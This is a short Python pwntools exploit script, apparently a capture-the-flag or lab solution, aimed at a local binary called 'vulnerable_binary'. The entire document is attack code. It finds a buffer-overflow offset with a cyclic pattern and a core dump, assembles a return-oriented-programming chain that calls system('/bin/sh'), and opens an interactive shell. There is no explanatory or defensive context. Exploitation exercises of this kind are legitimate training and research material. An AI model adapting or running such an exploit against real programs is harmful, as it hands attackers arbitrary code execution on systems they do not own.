```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

elf = ELF("./vulnerable_binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(elf.path)

BADCHARS = {0x00, 0x0a, 0x0d, 0x20}

def find_offset():
    pattern = cyclic(1024, n=8)
    p.sendline(pattern)
    p.wait()
    core = Core("core")
    fault = core.fault_addr
    offset = cyclic_find(fault, n=8)
    return offset

def is_clean(addr):
    payload = p64(addr)
    return not any(b in payload for b in bytes(BADCHARS))

rop = ROP(elf)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

bin_sh = next(elf.search(b"/bin/sh\x00"))
system = elf.symbols["system"]

offset = find_offset()

payload = b"A" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```
